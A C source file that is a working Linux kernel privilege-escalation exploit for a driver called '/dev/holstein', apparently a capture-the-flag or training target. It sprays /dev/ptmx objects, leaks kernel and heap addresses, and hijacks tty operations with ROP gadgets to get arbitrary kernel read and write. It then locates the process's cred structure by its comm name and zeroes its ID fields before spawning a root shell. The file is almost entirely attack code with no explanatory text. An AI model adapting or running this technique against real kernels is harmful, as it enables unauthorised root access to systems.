#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <sys/prctl.h>

/*
0xffffffff8118a285: mov eax, dword ptr [rdx]; ret;
0xffffffff810477f7: mov qword ptr [rdx], rcx; ret; 
*/

#define op_aar 0x18a285
#define op_aaw 0x477f7

unsigned long kernel_base;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long user_cs, user_sp, user_ss, user_rflags;
int spray[100];
unsigned long * p;
char buf[0x500];
unsigned long g_buf;
unsigned long heap;
unsigned long kernel_addr;
int fd;
int cache_fd = -1;
unsigned long cred_addr;

void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}

int aar(unsigned long addr)
{  
    int result;
    *(unsigned long *)&buf[0x418] = g_buf;
    p[0xc] = kernel_base + op_aar;
    write(fd, buf, 0x500);
    if (cache_fd == -1)
    {
	    for (int i = 0; i < 100; i++) {
	       result = ioctl(spray[i], 0, addr);
	       if (result != -1)
	       {
	       	   cache_fd = spray[i];
		   return result;
	       }
	    }   
    }	
    else
    	return(result = ioctl(cache_fd, 0, addr));
}

void aaw(unsigned long target_addr, unsigned long data)
{
    *(unsigned long *)&buf[0x418] = g_buf;
    p[0xc] = kernel_base + op_aaw;
    write(fd, buf, 0x500);
    for (int i = 0; i < 100; i++) {
       ioctl(spray[i], target_addr, data);
    }   		
}


int main() {
    int result;
    for (int i = 0; i < 50; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    fd = open("/dev/holstein", O_RDWR);
    for (int i = 50; i < 100; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    read(fd, buf, 0x500);
    p = (unsigned long *)&buf;
    heap = p[0x9f];
    printf("heap:0x%lx\n", heap);
    g_buf = heap - 0x4f8 ;
    printf("g_buf:0x%lx\n", g_buf);
    kernel_addr = p[0x83];
    printf("kernel_addr:0x%lx\n", kernel_addr);
    kernel_base = kernel_addr - 0xc38880;
    printf("kernel_base:0x%lx\n", kernel_base);
    prctl(PR_SET_NAME, "h0pe-ay!");
    for (unsigned long addr = g_buf - 0x1000000;; addr += 0x8)
    {
    	if (aar(addr) == 0x65703068 && aar(addr+4) == 0x2179612d)
    	{
    		printf("[+] found!\n");
    		printf("addr:0x%lx\n", addr);
    		cred_addr = aar(addr - 4);
    		cred_addr = (cred_addr << 32) | aar(addr - 8);
    		printf("cred_addr:0x%lx\n", cred_addr);
    		break;
    	}
    }
    for (int i = 1; i < 9; i++)
    	aaw(0, cred_addr + i*4);
    backdoor();
   
}
